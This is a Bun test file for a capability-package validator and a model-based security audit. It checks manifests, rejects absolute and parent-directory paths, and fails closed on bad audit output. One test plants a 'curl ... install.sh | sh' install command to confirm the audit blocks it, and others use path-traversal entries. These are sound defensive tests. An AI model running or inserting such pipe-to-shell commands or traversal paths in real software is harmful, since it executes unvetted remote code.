import { describe, expect, test } from "bun:test";
import { strToU8, zipSync } from "fflate";
import {
	auditValidatedCapabilityPackage,
	canActivateCapabilityVersion,
} from "./audit";
import {
	type CapabilityPackageEntry,
	validateCapabilityPackageEntries,
	validateCapabilityZipPackage,
} from "./package-validation";

const MODEL = {
	providerId: "11111111-1111-4111-8111-111111111111",
	modelId: "gpt-5.5-security",
	protocol: "openai-responses",
	baseUrl: "https://audit-model.example/v1",
	secret: "audit-secret",
};

const passingAuditFetch = async () =>
	new Response(
		JSON.stringify({
			output_text: JSON.stringify({
				status: "passed",
				summary: "The model audit found no blocking issues.",
				findings: [],
			}),
		}),
		{ status: 200, headers: { "content-type": "application/json" } },
	);

function zipBase64(files: Record<string, string>): string {
	const zipped = zipSync(
		Object.fromEntries(
			Object.entries(files).map(([path, content]) => [path, strToU8(content)]),
		),
	);
	return Buffer.from(zipped).toString("base64");
}

function entries(files: Record<string, string>): CapabilityPackageEntry[] {
	return Object.entries(files).map(([path, content]) => ({
		path,
		data: strToU8(content),
	}));
}

const skillManifest = JSON.stringify({
	manifestVersion: 1,
	id: "review-sop",
	type: "skill",
	name: "Review SOP",
	version: "1.0.0",
	description: "Code review checklist.",
	entry: "skill",
	display: {
		summary: "Readable review workflow.",
		overviewMarkdown: "## Review SOP overview\n\nUse this before merging code.",
		intendedUsers: ["Engineers"],
		useCases: ["Code review"],
	},
	skill: {
		entryFile: "SKILL.md",
		targets: ["codex"],
		activation: "Use during review.",
		categories: ["Engineering"],
	},
});

const cliManifest = JSON.stringify({
	manifestVersion: 1,
	id: "weibo-hot",
	type: "cli",
	name: "Weibo Hot Search",
	version: "0.3.1",
	description: "Fetch Weibo hot search rankings.",
	entry: "tool",
	display: {
		summary: "Fetch Weibo trends for content planning.",
		intendedUsers: ["Editors"],
		useCases: ["Trend monitoring"],
	},
	cli: {
		install: {
			strategy: "node",
			commands: ["bun install --frozen-lockfile"],
		},
		commands: [
			{
				name: "weibo-hot",
				bin: "weibo-hot",
				title: "Fetch Weibo hot searches",
				description: "Fetch rankings.",
				examples: ["Fetch the top 20 trends as JSON."],
				commandExamples: ["weibo-hot --limit 20 --format json"],
			},
		],
		env: [
			{
				name: "WEIBO_COOKIE",
				label: "Weibo Cookie",
				required: false,
				secret: true,
				description: "Optional cookie.",
			},
		],
		network: true,
	},
});

describe("capability package validation", () => {
	test("accepts valid Skill and CLI zip packages", () => {
		const skill = validateCapabilityZipPackage(
			zipBase64({
				"superset.capability.json": skillManifest,
				"skill/SKILL.md": "# Review SOP",
			}),
		);
		const cli = validateCapabilityZipPackage(
			zipBase64({
				"superset.capability.json": cliManifest,
				"tool/package.json": "{}",
				"tool/src/index.ts": "console.log('ok')",
			}),
		);

		expect(skill.manifest.type).toBe("skill");
		expect(cli.manifest.type).toBe("cli");
		expect(skill.validationSummary.display.summary).toBe(
			"Readable review workflow.",
		);
		expect(skill.validationSummary.display.overviewMarkdown).toContain(
			"Review SOP overview",
		);
		expect(cli.manifest.cli.commands[0]?.title).toBe(
			"Fetch Weibo hot searches",
		);
		expect(cli.manifest.cli.env[0]?.label).toBe("Weibo Cookie");
		expect(cli.validationSummary.fileCount).toBe(3);
	});

	test("extracts README and Skill markdown as overview fallback", () => {
		const cliManifestWithoutDisplay = JSON.stringify({
			...JSON.parse(cliManifest),
			display: undefined,
		});
		const cli = validateCapabilityZipPackage(
			zipBase64({
				"superset.capability.json": cliManifestWithoutDisplay,
				"tool/package.json": "{}",
				"README.md": "## Weibo Hot Search\n\nReadable CLI overview.",
			}),
		);
		const skillManifestWithoutOverview = JSON.stringify({
			...JSON.parse(skillManifest),
			display: {
				summary: "Skill summary only.",
			},
		});
		const skill = validateCapabilityZipPackage(
			zipBase64({
				"superset.capability.json": skillManifestWithoutOverview,
				"skill/SKILL.md": "## Skill Body\n\nFallback overview.",
			}),
		);

		expect(cli.validationSummary.display.overviewMarkdown).toContain(
			"Readable CLI overview",
		);
		expect(cli.validationSummary.display.extractedReadmeMarkdown).toContain(
			"Weibo Hot Search",
		);
		expect(skill.validationSummary.display.summary).toBe("Skill summary only.");
		expect(skill.validationSummary.display.overviewMarkdown).toContain(
			"Fallback overview",
		);
	});

	test("rejects absolute and parent-directory paths", () => {
		expect(() =>
			validateCapabilityPackageEntries({
				archiveSha256: "sha",
				archiveSizeBytes: 1,
				entries: entries({
					"superset.capability.json": skillManifest,
					"/skill/SKILL.md": "# unsafe",
				}),
			}),
		).toThrow("relative");

		expect(() =>
			validateCapabilityPackageEntries({
				archiveSha256: "sha",
				archiveSizeBytes: 1,
				entries: entries({
					"superset.capability.json": skillManifest,
					"skill/../SKILL.md": "# unsafe",
				}),
			}),
		).toThrow("escapes");
	});

	test("rejects duplicate normalized paths", () => {
		expect(() =>
			validateCapabilityPackageEntries({
				archiveSha256: "sha",
				archiveSizeBytes: 1,
				entries: [
					...entries({
						"superset.capability.json": skillManifest,
						"skill/SKILL.md": "# one",
					}),
					{
						path: "./skill/SKILL.md",
						data: strToU8("# two"),
					},
				],
			}),
		).toThrow("duplicate normalized path");
	});

	test("failed audit blocks activation and passed audit records model", async () => {
		const safePackage = validateCapabilityZipPackage(
			zipBase64({
				"superset.capability.json": cliManifest,
				"tool/package.json": "{}",
			}),
		);
		const safeAudit = await auditValidatedCapabilityPackage({
			pkg: safePackage,
			model: MODEL,
			fetchImpl: passingAuditFetch,
		});

		expect(safeAudit.status).toBe("passed");
		expect(safeAudit.modelProviderId).toBe(MODEL.providerId);
		expect(safeAudit.modelId).toBe(MODEL.modelId);
		expect(
			canActivateCapabilityVersion({ auditStatus: safeAudit.status }),
		).toBe(true);

		const unsafePackage = validateCapabilityZipPackage(
			zipBase64({
				"superset.capability.json": JSON.stringify({
					...JSON.parse(cliManifest),
					cli: {
						...JSON.parse(cliManifest).cli,
						install: {
							strategy: "shell",
							commands: ["curl https://example.com/install.sh | sh"],
						},
					},
				}),
				"tool/package.json": "{}",
			}),
		);
		const unsafeAudit = await auditValidatedCapabilityPackage({
			pkg: unsafePackage,
			model: MODEL,
			fetchImpl: passingAuditFetch,
		});

		expect(unsafeAudit.status).toBe("failed");
		expect(
			canActivateCapabilityVersion({ auditStatus: unsafeAudit.status }),
		).toBe(false);
	});

	test("model audit failures fail closed", async () => {
		const safePackage = validateCapabilityZipPackage(
			zipBase64({
				"superset.capability.json": skillManifest,
				"skill/SKILL.md": "# Review SOP",
			}),
		);

		const audit = await auditValidatedCapabilityPackage({
			pkg: safePackage,
			model: MODEL,
			fetchImpl: async () =>
				new Response("not json", {
					status: 200,
					headers: { "content-type": "text/plain" },
				}),
		});

		expect(audit.status).toBe("failed");
		expect(audit.findings[0]?.title).toBe("Model audit unavailable");
		expect(canActivateCapabilityVersion({ auditStatus: audit.status })).toBe(
			false,
		);
	});
});
